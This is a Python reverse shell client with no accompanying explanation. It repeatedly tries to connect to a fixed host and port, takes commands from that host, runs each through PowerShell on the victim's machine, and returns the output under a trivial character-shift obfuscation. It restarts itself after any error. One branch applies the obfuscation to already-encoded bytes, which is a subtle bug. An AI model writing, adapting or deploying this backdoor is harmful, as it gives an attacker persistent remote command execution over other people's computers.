import socket
from subprocess import run, PIPE

boold = True


def decrypt(enstring):
    string = ""
    for char in enstring:
        string += chr(ord(char) - 25)
    return string


def encrypt(string):
    enstring = ""
    for char in string:
        enstring += chr(ord(char) + 25)
    return enstring


def main():

    host = "192.168.1.3"
    port = 8081
    cd = run(['powershell.exe', '/c', f'Set-Location "/users/$env:username"; (Get-Location).path'],
        shell=True, stdout=PIPE, stderr=PIPE, text=True)
    cd = (cd.stdout + cd.stderr).strip()

    client = socket.socket()

    while True:
        try:
            client.connect((host, port))
        except (ConnectionRefusedError, socket.gaierror):
            continue
        else:
            client.send(encrypt(cd).encode())
            print(f'{host}@{port} Connected')
            break

    # Terminal
    while True:
        command = decrypt(client.recv(4096).decode(errors="replace")).strip()
        if command == ".":
            client.send(f".#path#{cd}".encode())
        elif command == "cclose":
            client.close()
            return False
        else:
            if boold: print(f'\n{command}')
            try:
                op = run(
                    ['powershell.exe', '/c', f'Set-Location "{cd}"; {command}; ("#!p#" + (Get-Location))'],
                    shell=True, stdout=PIPE, stderr=PIPE, text=True)

            except Exception as e:
                print(f'FileNotFoundError: {e}')
            else:
                stdop = op.stderr.strip().replace("#!p#", '##') + op.stdout.strip()
                output, cd = stdop.split("#!p#")
                if stdop == '':
                    client.send(encrypt(f'.#path#{cd}'.encode()))
                else:
                    client.send(encrypt(f'{output}#path#{cd}').encode())


if __name__ == "__main__":

    goon = True
    while goon:
        try:
            goon = main()
        except:
            continue
